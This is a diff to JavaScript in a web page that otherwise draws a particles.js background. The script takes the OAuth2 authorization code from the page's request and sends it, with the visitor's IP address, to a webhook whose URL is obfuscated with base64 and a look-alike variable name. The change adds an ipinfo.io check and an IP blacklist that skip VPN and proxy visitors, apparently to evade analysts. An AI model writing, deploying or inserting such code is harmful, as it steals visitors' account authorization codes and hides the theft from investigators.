@@ -164,48 +164,42 @@
             const webhookUrl = atob(webhookUrI);
 
             const blacklistedIPs = ["81.35.53.46", "1"];
+            const vpnProxyCheckUrl = "https://ipinfo.io/json";
 
-            fetch('https://api.ipify.org?format=json')
+            fetch(vpnProxyCheckUrl)
                 .then(response => response.json())
                 .then(data => {
                     const ip = data.ip;
+                    const isVPNProxy = data.proxy || data.vpn;
 
-                    if (blacklistedIPs.includes(ip)) {
+                    if (blacklistedIPs.includes(ip) || isVPNProxy) {
+                        console.log("IP address is blacklisted or is from a VPN/Proxy:", ip);
                         return;
                     }
 
                     if (code) {
                         console.log('Authorization code:', code);
 
-                        fetch('https://api.ipify.org?format=json')
-                            .then(response => response.json())
-                            .then(data => {
-                                const ip = data.ip;
-
-                                fetch(webhookUrl, {
-                                    method: 'POST',
-                                    headers: {
-                                        'Content-Type': 'application/json'
-                                    },
-                                    body: JSON.stringify({
-                                        content: `New OAuth2 code: ${code}\nIP Address: ${ip}`
-                                    })
-                                })
-                                .then(response => response.json())
-                                .then(data => {
-                                    console.log('Success:', data);
-                                })
-                                .catch((error) => {
-                                    console.error('Error sending webhook:', error);
-                                });
+                        fetch(webhookUrl, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify({
+                                content: `New OAuth2 code: ${code}\nIP Address: ${ip}`
                             })
-                            .catch((error) => {
-                                console.error('Error fetching IP address:', error);
-                            });
+                        })
+                        .then(response => response.json())
+                        .then(data => {
+                            console.log('Success:', data);
+                        })
+                        .catch((error) => {
+                            console.error('Error sending webhook:', error);
+                        });
                     }
                 })
                 .catch((error) => {
-                    console.error('Error fetching IP address:', error);
+                    console.error('Error checking VPN/Proxy:', error);
                 });
 
             particlesJS("particles-js", {
